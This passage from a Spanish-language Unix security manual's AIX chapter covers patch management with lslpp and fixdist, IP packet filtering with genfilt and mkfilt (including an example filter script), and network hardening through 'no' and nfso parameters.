&#x00A0;&#x00A0;&#x00A0;Java130.rte.lib&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;1.3.0.5&#x00A0;&#x00A0;&#x00A0;&#x00A0;C&#x00A0;&#x00A0;&#x00A0;&#x00A0;Java&#x00A0;Runtime&#x00A0;Environment
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Libraries
&#x00A0;
&#x00A0;
&#x00A0;State&#x00A0;codes:
&#x00A0;&#x00A0;A&#x00A0;--&#x00A0;Applied.
&#x00A0;&#x00A0;B&#x00A0;--&#x00A0;Broken.
&#x00A0;&#x00A0;C&#x00A0;--&#x00A0;Committed.
&#x00A0;&#x00A0;O&#x00A0;--&#x00A0;Obsolete.&#x00A0;&#x00A0;(partially&#x00A0;migrated&#x00A0;to&#x00A0;newer&#x00A0;version)
&#x00A0;&#x00A0;?&#x00A0;--&#x00A0;Inconsistent&#x00A0;State...Run&#x00A0;lppchk&#x00A0;-v.
&#x00A0;bruja:/#&#x00A0;lslpp&#x00A0;-h&#x00A0;X11.adt.lib
&#x00A0;&#x00A0;&#x00A0;Fileset&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Level&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Action&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Status&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Date&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Time
&#x00A0;&#x00A0;&#x00A0;--------------------------------------------------------------------------
&#x00A0;Path:&#x00A0;/usr/lib/objrepos
&#x00A0;&#x00A0;&#x00A0;X11.adt.lib
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;4.3.3.0&#x00A0;&#x00A0;&#x00A0;COMMIT&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;COMPLETE&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;09/29/99&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;09:55:30
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;4.3.3.10&#x00A0;&#x00A0;&#x00A0;COMMIT&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;COMPLETE&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;06/12/01&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;11:25:48
&#x00A0;bruja:/#
</literallayout>
<!--l. 1245--><para>IBM ofrece sus parches para AIX tanto en CD-ROM como a trav&#x00E9;s de Internet, desde la direcci&#x00F3;n
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;http://techsupport.services.ibm.com/server/support/
</literallayout>
<!--l. 1252--><para>Cada parche se suele identi&#xFB01;car de forma un&#x02CA;&#x0131;voca bien a trav&#x00E9;s de su n&#x00FA;mero PTF, bien a trav&#x00E9;s de su APAR, o
simplemente por su nombre y versi&#x00F3;n. Para instalarlo en un sistema AIX se suele utilizar smit
install<informalequation><graphic 
fileref="unixsec200x.gif"></graphic></informalequation>update o, desde l&#x02CA;&#x0131;nea de comando, la orden instfix; no obstante, la instalaci&#x00F3;n de parches y
actualizaci&#x00F3;n de software en general suele resultar bastante engorrosa en AIX si se realiza &#x00FA;nicamente de esta
forma: en funci&#x00F3;n de nuestro nivel de sistema operativo (determinado con la orden &#x2018;oslevel&#x2019;) y la
actualizaci&#x00F3;n que necesitemos llevar a cabo, es posible que la instalaci&#x00F3;n de un &#x00FA;nico parche implique horas de
trabajo, ya que ese parche puede necesitar como prerequisito un conjunto de parches que
no est&#x00E1;n instalados, y que a su vez necesitan m&#x00E1;s parches; de esta forma, es muy posible que
para una peque~na actualizaci&#x00F3;n necesitemos m&#x00E1;s de un gigabyte de &#xFB01;cheros descargados en el
sistema.
<!--br/--></para><figure><title/><blockquote>
<section role="center"><title/>
<!--l. 1268--><para>
heightwidthdepth&#xFB01;xdist.png                                                           <graphic width="430.0pt" fileref="fixdist.png" ></graphic></para></section>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-1720012"  ></anchor>Figura&#x00A0;11.2</title><para>Interfaz de fixdist (AIX).</para></blockquote>
  </blockquote></figure>
<!--br/-->Por fortuna, en un sistema AIX podemos utilizar fixdist, un c&#x00F3;modo entorno gr&#x00E1;&#xFB01;co (en la &#xFB01;gura  <ulink 
  url="#x1-1720012"  ><!--ref: fixdist--></ulink>
podemos ver su interfaz) que nos facilitar&#x00E1; enormente esta tarea, ya que calcula todos los parches
que conformar&#x00E1;n nuestro &#x00E1;rbol de prerequisitos y los descarga autom&#x00E1;ticamente; gracias a esta
herramienta, descargar todos los prerrequisitos de un determinado parche se convierte en una tarea
trivial.
  </section><!--end section--><!--l. 1282--><section 
role="section"><title><abbrev role="title-mark">11.7</abbrev><anchor 
   id="x1-17300011.7"  ></anchor>Extensiones de la seguridad: &#xFB01;ltros IP</title>
<!--l. 1283--><para>  En versiones m&#x00E1;s o menos recientes de AIX el operativo proporciona &#x2018;de serie&#x2019; unos interesantes
mecanismos de seguridad IP basados en t&#x00FA;neles y &#xFB01;ltros de paquetes, algo similar &#x2013; guardando las
distancias &#x2013; a ipchains o iptables en Linux; el uso de t&#x00FA;neles requiere &#xFB01;ltros, pero el de &#xFB01;ltros no necesita
para nada los t&#x00FA;neles. Para poder utilizar ambos mecanismos necesitamos tener instalado el paquete (m&#x00E1;s
concretamente, el &#xFB01;leset) bos.net.ipsec.rte:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;lslpp&#x00A0;-l&#x00A0;bos.net.ipsec.rte
&#x00A0;&#x00A0;&#x00A0;Fileset&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Level&#x00A0;&#x00A0;State&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Description
&#x00A0;&#x00A0;&#x00A0;----------------------------------------------------------------------------
&#x00A0;Path:&#x00A0;/usr/lib/objrepos
&#x00A0;&#x00A0;&#x00A0;bos.net.ipsec.rte&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;4.3.3.0&#x00A0;&#x00A0;COMMITTED&#x00A0;&#x00A0;IP&#x00A0;Security
&#x00A0;
&#x00A0;Path:&#x00A0;/etc/objrepos
&#x00A0;&#x00A0;&#x00A0;bos.net.ipsec.rte&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;4.3.3.0&#x00A0;&#x00A0;COMMITTED&#x00A0;&#x00A0;IP&#x00A0;Security
&#x00A0;bruja:/#
</literallayout>
<!--l. 1302--><para>Un t&#x00FA;nel de&#xFB01;ne una asociaci&#x00F3;n entre dos m&#x00E1;quinas en las que se han especi&#xFB01;cado par&#x00E1;metros de seguridad
compartidos entre los dos extremos del t&#x00FA;nel; el hecho de que se implique a otra m&#x00E1;quina hace que,
excepto en entornos muy homog&#x00E9;nos &#x2013; sistemas AIX &#x2013; o en casos concretos, no se suela utilizar
este mecanismo. En cambio, el &#xFB01;ltrado de paquetes s&#x02CA;&#x0131; que se utiliza, ya que proporciona a un
entorno aislado una protecci&#x00F3;n frente a otras m&#x00E1;quinas sin tener que modi&#xFB01;car para nada el
operativo o las aplicaciones de estas: proporciona un sistema de &#xFB01;ltrado sencillo pero efectivo en
m&#x00E1;quinas en las que por cualquier motivo &#x2013; dinero, utilizaci&#x00F3;n, rendimiento&#x2026;&#x2013; no se pueden
implantar otras soluciones cortafuegos m&#x00E1;s completas, como CheckPoint Firewall&#x2013;1 o IBM
SecureWay Firewall. Por este motivo, en este punto vamos a comentar brevemente algunos
aspectos del &#xFB01;ltrado de paquetes en AIX, sin entrar en el apartado de t&#x00FA;neles; si alguien est&#x00E1;
interesado en profundizar m&#x00E1;s en estos mecanismos de seguridad IP para AIX, puede consultar
<citation>[?]</citation>.
<!--br/-->
<!--br/-->Para gestionar este sistema de &#xFB01;ltrado podemos utilizar &#x00F3;rdenes como rmfilt, mkfilt, genfilt o lsfilt;
como siempre, es recomendable consultar las p&#x00E1;ginas de ayuda de cada una de ellas, aunque en este caso m&#x00E1;s
que recomendable podr&#x02CA;&#x0131;amos decir imprescindible, ya que el manejo de los &#xFB01;ltros no es ni mucho menos
inmediato, y la sintaxis para de&#xFB01;nir reglas es relativamente compleja. Para poner en marcha
el sistema de &#xFB01;ltrado necesitamos generar reglas y posteriormente activarlas; en el &#xFB01;chero
/usr/samples/ipsec/filter.sample tenemos ejemplos de como de&#xFB01;nir una regla, un &#xFB01;ltro de red,
mediante genfilt.
<!--br/-->
<!--br/-->El uso de genfilt puede llegar a ser bastante complicado, debido principalmente a su sintaxis (como
acabamos de decir, es imprescindible consultar su p&#x00E1;gina de manual). Para de&#xFB01;nir una regla nueva es
obligatorio indicar al menos el protocolo sobre el que se aplicar&#x00E1; (IPv4 o IPv6), as&#x02CA;&#x0131; como el host o red
origen y su m&#x00E1;scara correspondiente; el resto de par&#x00E1;metros (destino, puertos de conexi&#x00F3;n, interfaz de
red&#x2026;) son opcionales, aunque como sucede en muchas otras ocasiones, es necesario estar atento
a los valores que el sistema toma por defecto: por simple Ley de Murphy, ser&#x00E1;n restrictivos
cuando nos interese que sean permisivos y viceversa. Para hacernos una idea de c&#x00F3;mo se de&#xFB01;nen
reglas mediante genfilt, si por ejemplo necesit&#x00E1;ramos permitir todo el tr&#x00E1;&#xFB01;co de una red local
contra una m&#x00E1;quina AIX situada en ella (192.168.0.10), la orden para lograrlo ser&#x02CA;&#x0131;a similar
a:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;genfilt&#x00A0;-v&#x00A0;4&#x00A0;-a&#x00A0;P&#x00A0;-s&#x00A0;192.168.0.0&#x00A0;-m&#x00A0;255.255.0.0&#x00A0;-d&#x00A0;192.168.0.10&#x00A0;-M&#x00A0;&#x005C;
&#x00A0;&#x003E;&#x00A0;255.255.255.255&#x00A0;-i&#x00A0;all
&#x00A0;bruja:/#
</literallayout>
<!--l. 1346--><para>Aunque no vamos a entrar aqu&#x02CA;&#x0131; en detalles de la sintaxis de las reglas, veremos al &#xFB01;nal de este punto un
shellscript como ejemplo de &#xFB01;ltrado en una m&#x00E1;quina AIX en el que se incluir&#x00E1;n algunas de&#xFB01;niciones de
&#xFB01;ltros; en cualquier caso, como ya hemos dicho, existe un &#xFB01;chero con ejemplos de reglas en
/usr/samples/ipsec/filter.sample que podemos consultar para hacernos una idea de la sintaxis de
genfilt.
<!--br/-->
<!--br/-->Para activar el conjunto de reglas de &#xFB01;ltrado que hayamos de&#xFB01;nido previamente mediante tenemos que
utilizar la orden mkfilt; no obstante, antes de esto debemos haber generado los dispositivos especiales
ipsec<informalequation><graphic 
fileref="unixsec201x.gif"></graphic></informalequation>v4 e ipsec<informalequation><graphic 
fileref="unixsec202x.gif"></graphic></informalequation>v6 (como su nombre indica, el segundo hace referencia a IPv6, mientras que el primero
es relativo al protocolo cl&#x00E1;sico) en el sistema de &#xFB01;cheros utilizando mkdev, ya que de lo contrario la activaci&#x00F3;n
no ser&#x00E1; posible:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;mkfilt&#x00A0;-v&#x00A0;4
&#x00A0;Device&#x00A0;ipsec&#x005F;v4&#x00A0;not&#x00A0;found.
&#x00A0;Filter&#x00A0;activation&#x00A0;for&#x00A0;IPv4&#x00A0;not&#x00A0;performed.
&#x00A0;bruja:/#&#x00A0;/usr/sbin/mkdev&#x00A0;-c&#x00A0;ipsec&#x00A0;-t&#x00A0;4
&#x00A0;ipsec&#x005F;v4&#x00A0;Available
&#x00A0;bruja:/#&#x00A0;/usr/sbin/mkdev&#x00A0;-c&#x00A0;ipsec&#x00A0;-t&#x00A0;6
&#x00A0;ipsec&#x005F;v6&#x00A0;Available
&#x00A0;bruja:/#
</literallayout>
<!--l. 1372--><para>Una vez creados ambos &#xFB01;cheros especiales ya podemos activar el ruleset de&#xFB01;nido; por ejemplo, el siguiente
shellscript &#x2013; o modi&#xFB01;caciones del mismo &#x2013; puede utilizarse para de&#xFB01;nir un sencillo sistema de &#xFB01;ltrado en
nuestra m&#x00E1;quina:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;cat&#x00A0;/etc/filtros
&#x00A0;#!/bin/sh
&#x00A0;#
&#x00A0;#&#x00A0;Script&#x00A0;para&#x00A0;filtrar&#x00A0;paquetes&#x00A0;en&#x00A0;una&#x00A0;maquina&#x00A0;AIX.
&#x00A0;#&#x00A0;Antonio&#x00A0;Villalon,&#x00A0;Noviembre&#x00A0;2001
&#x00A0;#
&#x00A0;#############
&#x00A0;#&#x00A0;Eliminamos&#x00A0;y&#x00A0;deshabilitamos&#x00A0;reglas&#x00A0;anteriores
&#x00A0;#############
&#x00A0;/usr/sbin/rmfilt&#x00A0;-v&#x00A0;4&#x00A0;-n&#x00A0;all
&#x00A0;/usr/sbin/rmfilt&#x00A0;-v&#x00A0;6&#x00A0;-n&#x00A0;all
&#x00A0;/usr/sbin/mkfilt&#x00A0;-v&#x00A0;4&#x00A0;-d
&#x00A0;/usr/sbin/mkfilt&#x00A0;-v&#x00A0;6&#x00A0;-d
&#x00A0;#############
&#x00A0;#&#x00A0;Permitimos&#x00A0;todo&#x00A0;desde&#x00A0;LAN
&#x00A0;#############
&#x00A0;genfilt&#x00A0;-v&#x00A0;4&#x00A0;-a&#x00A0;P&#x00A0;-s&#x00A0;192.168.0.0&#x00A0;-m&#x00A0;255.255.0.0&#x00A0;-d&#x00A0;192.168.0.10&#x00A0;-M&#x00A0;&#x005C;
&#x00A0;255.255.255.255&#x00A0;-i&#x00A0;all
&#x00A0;#############
&#x00A0;#&#x00A0;Salida,&#x00A0;todo&#x00A0;abierto
&#x00A0;#############
&#x00A0;genfilt&#x00A0;-v&#x00A0;4&#x00A0;-a&#x00A0;P&#x00A0;-s&#x00A0;192.168.0.10&#x00A0;-m&#x00A0;255.255.255.255&#x00A0;-d&#x00A0;0&#x00A0;-M&#x00A0;0
&#x00A0;#############
&#x00A0;#&#x00A0;Vuelta&#x00A0;de&#x00A0;DNS
&#x00A0;#############
&#x00A0;genfilt&#x00A0;-v&#x00A0;4&#x00A0;-a&#x00A0;P&#x00A0;-s&#x00A0;0&#x00A0;-m&#x00A0;0&#x00A0;-d&#x00A0;0&#x00A0;-M&#x00A0;0&#x00A0;-g&#x00A0;N&#x00A0;-c&#x00A0;udp&#x00A0;-o&#x00A0;eq&#x00A0;-p&#x00A0;53&#x00A0;-O&#x00A0;gt&#x00A0;-P&#x00A0;1023
&#x00A0;#############
&#x00A0;#&#x00A0;Prohibimos&#x00A0;todo&#x00A0;lo&#x00A0;no&#x00A0;habilitado&#x00A0;por&#x00A0;defecto
&#x00A0;#############
&#x00A0;genfilt&#x00A0;-v&#x00A0;4&#x00A0;-a&#x00A0;P&#x00A0;-s&#x00A0;0&#x00A0;-m&#x00A0;0&#x00A0;-d&#x00A0;192.168.0.10&#x00A0;-M&#x00A0;255.255.255.255&#x00A0;-c&#x00A0;tcp/ack
&#x00A0;genfilt&#x00A0;-v&#x00A0;4&#x00A0;-a&#x00A0;D&#x00A0;-s&#x00A0;0&#x00A0;-m&#x00A0;0&#x00A0;-d&#x00A0;192.168.0.10&#x00A0;-M&#x00A0;255.255.255.255
&#x00A0;#############
&#x00A0;#&#x00A0;Activamos&#x00A0;las&#x00A0;reglas&#x00A0;para&#x00A0;IP&#x00A0;e&#x00A0;IPv6
&#x00A0;#############
&#x00A0;/usr/sbin/mkfilt&#x00A0;-v&#x00A0;4&#x00A0;-u
&#x00A0;/usr/sbin/mkfilt&#x00A0;-v&#x00A0;6&#x00A0;-u
&#x00A0;bruja:/#
</literallayout>
<!--l. 1417--><para>Podemos ver que la activaci&#x00F3;n del conjunto de reglas se realiza mediante la opci&#x00F3;n &#x2018;-u&#x2019; de mkfilt, tanto para
IPv4 como para IPv6; esto signi&#xFB01;ca que es a partir de la ejecuci&#x00F3;n de esta orden cuando el sistema de
&#xFB01;ltrado comienza a funcionar.
<!--br/-->
<!--br/-->Para consultar el conjunto de reglas de&#xFB01;nidas en nuestra m&#x00E1;quina podemos utilizar el comando
lsfilt (si lo ejecutamos sin ninguna opci&#x00F3;n nos proporcionar&#x00E1; el listado de todas las reglas,
tanto activas &#x2013; las que se est&#x00E1;n aplicando &#x2013; como inactivas &#x2013; de&#xFB01;nidas pero sin ser aplicadas
&#x2013;). Como en otros sistemas de &#xFB01;ltrado, a cada regla se le asigna un n&#x00FA;mero de orden, y es
ese n&#x00FA;mero el que indica la precedencia de su aplicaci&#x00F3;n: si un paquete hace match con una
cierta regla, es esa la que se aplica, descartando las que son posteriores; es una aproximaci&#x00F3;n
similar a la seguida en Firewall&#x2013;1 o ipchains, pero diferente de la de otros cortafuegos como IP
Filter. Para consultar una regla concreta podemos utilizar las diferentes opciones de la orden
lsfilt:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;lsfilt&#x00A0;-v&#x00A0;4&#x00A0;-n&#x00A0;3
&#x00A0;Rule&#x00A0;3:
&#x00A0;Rule&#x00A0;action&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;:&#x00A0;permit
&#x00A0;Source&#x00A0;Address&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;:&#x00A0;192.168.0.0
&#x00A0;Source&#x00A0;Mask&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;:&#x00A0;255.255.0.0
&#x00A0;Destination&#x00A0;Address&#x00A0;:&#x00A0;192.168.0.10
&#x00A0;Destination&#x00A0;Mask&#x00A0;&#x00A0;&#x00A0;&#x00A0;:&#x00A0;255.255.255.255
&#x00A0;Source&#x00A0;Routing&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;:&#x00A0;yes
&#x00A0;Protocol&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;:&#x00A0;all
&#x00A0;Source&#x00A0;Port&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;:&#x00A0;any&#x00A0;0
&#x00A0;Destination&#x00A0;Port&#x00A0;&#x00A0;&#x00A0;&#x00A0;:&#x00A0;any&#x00A0;0
&#x00A0;Scope&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;:&#x00A0;both
&#x00A0;Direction&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;:&#x00A0;both
&#x00A0;Logging&#x00A0;control&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;:&#x00A0;no
&#x00A0;Fragment&#x00A0;control&#x00A0;&#x00A0;&#x00A0;&#x00A0;:&#x00A0;all&#x00A0;packets
&#x00A0;Tunnel&#x00A0;ID&#x00A0;number&#x00A0;&#x00A0;&#x00A0;&#x00A0;:&#x00A0;0
&#x00A0;Interface&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;:&#x00A0;all
&#x00A0;Auto-Generated&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;:&#x00A0;no
&#x00A0;bruja:/#
</literallayout>
<!--l. 1455--><para>Para acabar este punto quiz&#x00E1;s es necesario saber c&#x00F3;mo deshabilitar el sistema de &#xFB01;ltrado; ya lo hemos visto
antes, en el shellscript de ejemplo, pero hay que recordar que mediante la opci&#x00F3;n &#x2018;-d&#x2019; de la orden mkfilt
podemos hacerlo. Esto es especialmente importante en situaciones en las que un &#xFB01;ltro incorrecto deja
inaccesible el sistema o alguna aplicaci&#x00F3;n cr&#x02CA;&#x0131;tica, ya que la posibilidad de deshabilitar todo el &#xFB01;ltrado
mediante una orden sencilla, en l&#x02CA;&#x0131;nea de comandos, proporciona una soluci&#x00F3;n r&#x00E1;pida y efectiva este tipo de
problemas.
  </para></section><!--end section--><!--l. 1463--><section 
role="section"><title><abbrev role="title-mark">11.8</abbrev><anchor 
   id="x1-17400011.8"  ></anchor>El subsistema de red</title>
<!--l. 1464--><para>  Igual que en Solaris hemos visto, antes de comentar aspectos relativos a la seguridad del subsistema de
red del operativo, la orden &#x2018;ndd&#x2019;, en AIX es necesario introducir el comando &#x2018;no&#x2019; (Network Options),
encargado de con&#xFB01;gurar (y visualizar) par&#x00E1;metros del subsistema de red de AIX. Y de la misma forma que
hemos dicho que la gesti&#x00F3;n de seguridad de los usuarios (contrase~nas, restricciones de acceso, l&#x02CA;&#x0131;mites&#x2026;) es en
AIX excelente, y que otros Unices deber&#x02CA;&#x0131;an tomar nota, es justo decir ahora que la con&#xFB01;guraci&#x00F3;n de
par&#x00E1;metros del n&#x00FA;cleo relativos a la seguridad en AIX es m&#x00E1;s pobre que en Solaris, aunque no por ello deba
considerarse d&#x00E9;bil o inadecuada.
<!--br/-->
<!--br/-->Como en cualquier Unix, una norma b&#x00E1;sica en la seguridad del subsistema de red para prevenir ataques de
spoo&#xFB01;ng es no reenviar paquetes a no ser que nuestro equipo trabaje como un router o una pasarela; por
tanto, es una buena idea desactivar el IP Forwarding tanto de tramas IP como de tramas
IPv6:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;no&#x00A0;-o&#x00A0;ipforwarding=0
&#x00A0;bruja:/#&#x00A0;no&#x00A0;-o&#x00A0;ip6forwarding=0
&#x00A0;bruja:/#
</literallayout>
<!--l. 1486--><para>Para evitar ataques de SYN Flooding es interesante el par&#x00E1;metro clean<informalequation><graphic 
fileref="unixsec203x.gif"></graphic></informalequation>partial<informalequation><graphic 
fileref="unixsec204x.gif"></graphic></informalequation>conns, que
de&#xFB01;ne si se van a eliminar aleatoriamente conexiones incompletas (aquellas en las que no se
ha completado el protocolo a tres bandas) de la cola del servidor para dejar hueco a nuevas
entradas:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;no&#x00A0;-o&#x00A0;clean&#x005F;partial&#x005F;conns=1
&#x00A0;bruja:/#
</literallayout>
<!--l. 1496--><para>Respecto a algunos aspectos del protocolo ICMP, es recomendable no responder a los pings lanzados a
direcciones de broadcast, ya que si lo hacemos podemos llegar a saturar una red, facilitando ataques de
negaci&#x00F3;n de servicio; esto se consigue asignando a la directiva bcastping un valor falso (&#x2018;0&#x2019;). De la misma
forma, es tambi&#x00E9;n interesante no permitir broadcasts dirigidos a una pasarela para que sean
emitidos en el otro extremo de la misma, para lo que debemos asignar a directed<informalequation><graphic 
fileref="unixsec205x.gif"></graphic></informalequation>broadcast un
valor &#x2018;0&#x2019;. Adem&#x00E1;s podemos hacer que nuestra m&#x00E1;quina no responda a peticiones ICMP del tipo
ICMP<informalequation><graphic 
fileref="unixsec206x.gif"></graphic></informalequation>MASK<informalequation><graphic 
fileref="unixsec207x.gif"></graphic></informalequation>REQUEST, asignando a la directiva icmpaddressmask el valor &#x2018;0&#x2019; (el que tiene por
defecto):

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;no&#x00A0;-o&#x00A0;bcastping=0
&#x00A0;bruja:/#&#x00A0;no&#x00A0;-o&#x00A0;directed&#x005F;broadcast=0
&#x00A0;bruja:/#&#x00A0;no&#x00A0;-o&#x00A0;icmpaddressmask=0
&#x00A0;bruja:/#
</literallayout>
<!--l. 1515--><para>Tambi&#x00E9;n relacionados con el protocolo ICMP, es necesario comentar aspectos relativos a las tramas
ICMP<informalequation><graphic 
fileref="unixsec208x.gif"></graphic></informalequation>REDIRECT; podemos restringir la emisi&#x00F3;n de estos paquetes (recordemos que s&#x00F3;lo un router deber&#x02CA;&#x0131;a
poder enviarlos) mediante la directiva ipsendredirects, mientras que para deshabilitar la recepci&#x00F3;n de los
mismos podemos utilizar ipignoreredirects:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;no&#x00A0;-o&#x00A0;ipsendredirects=0
&#x00A0;bruja:/#&#x00A0;no&#x00A0;-o&#x00A0;ipignoreredirects=1
&#x00A0;bruja:/#
</literallayout>
<!--l. 1528--><para>Como ya vimos, la gesti&#x00F3;n de paquetes source routed tambi&#x00E9;n puede presentar serias amenazas a nuestra
seguridad; en AIX tenemos varios par&#x00E1;metros relativos al manejo de este tipo de tramas. En
primer lugar es necesario desactivar tanto la generaci&#x00F3;n como la recepci&#x00F3;n y el reenv&#x02CA;&#x0131;o de las
mismas, mediante los par&#x00E1;metros ipsrcroutesend, ipsrcrouterecv e ipsrcrouteforward
respectivamente, asignandoles a todos valores de &#x2018;0&#x2019; (falso); el &#x00FA;ltimo de ellos tiene un equivalente
especial para IPv6 denominado ip6srcrouteforward. Adem&#x00E1;s, otro par&#x00E1;metro importante es
nonlocsrcroute, que indica que s&#x00F3;lo los paquetes source routed estrictos (strict source routed,
paquetes en los que se especi&#xFB01;ca el camino concreto que ha de seguir la trama, a diferencia de los
paquetes loose source routed, en los que s&#x00F3;lo se marca un nodo por el que la trama ha de pasar y
no el camino completo) pueden ser reenviados a trav&#x00E9;s del host; su valor tambi&#x00E9;n ha de ser
falso <anchor 
   id="x1-174001f3"  ></anchor><footnote><para>     En sistemas SP/2 (Scallable Power Parallel) de IBM esto puede ser problem&#x00E1;tico para algunas aplicaciones, por lo que es
conveniente consultar la documentaci&#x00F3;n del sistema en cada caso.</para></footnote>:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;no&#x00A0;-o&#x00A0;ipsrcroutesend=0
&#x00A0;bruja:/#&#x00A0;no&#x00A0;-o&#x00A0;ipsrcrouterecv=0
&#x00A0;bruja:/#&#x00A0;no&#x00A0;-o&#x00A0;ipsrcrouteforward=0
&#x00A0;bruja:/#&#x00A0;no&#x00A0;-o&#x00A0;ip6srcrouteforward=0
&#x00A0;bruja:/#&#x00A0;no&#x00A0;-o&#x00A0;nonlocsrcroute=0
&#x00A0;bruja:/#
</literallayout>
<!--l. 1556--><para>Respecto al timeout de la cach&#x00E9; ARP del que ya hemos hablado en Solaris y Linux, en AIX este par&#x00E1;metro
viene de&#xFB01;nido por la variable arpt<informalequation><graphic 
fileref="unixsec210x.gif"></graphic></informalequation>killc; no obstante, su valor afecta tanto a entradas ARP no utilizadas
como a entradas activas, por lo que nos debemos plantear con cuidado la conveniencia de
modi&#xFB01;carlo; en cualquier caso, podemos de&#xFB01;nir en minutos el timeout tambi&#x00E9;n mediante la orden
no:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;no&#x00A0;-o&#x00A0;arpt&#x005F;killc=1
&#x00A0;bruja:/#
</literallayout>
<!--l. 1568--><para>Adem&#x00E1;s de la orden &#x2018;no&#x2019;, otro comando que nos permite con&#xFB01;gurar par&#x00E1;metros interesantes para nuestra
seguridad a nivel del subsistema de red &#x2013; especialmente si administramos un servidor NFS &#x2013; es &#x2018;nfso&#x2019;, que
con&#xFB01;gura y visualiza diferentes par&#x00E1;metros relacionados con este sistema de &#xFB01;cheros; su sintaxis es bastante
similar a la de &#x2018;no&#x2019; (en cualquier caso, como sucede con todas las &#x00F3;rdenes de un sistema Unix, es
recomendable consultar la p&#x00E1;gina de manual correspondiente), y entre los par&#x00E1;metros que permite con&#xFB01;gurar
existen tambi&#x00E9;n algunos relacionados con la seguridad del sistema. Quiz&#x00E1;s el m&#x00E1;s importante es portcheck,
que de&#xFB01;ne el comportamiento del servidor ante peticiones provenientes de puertos no privilegiados: si su
valor es 0 (por defecto es as&#x02CA;&#x0131;) no se efect&#x00FA;a ning&#x00FA;n tipo de comprobaci&#x00F3;n, mientras que si es 1 se
realiza el port checking y s&#x00F3;lo se admiten peticiones desde puertos remotos privilegiados; por
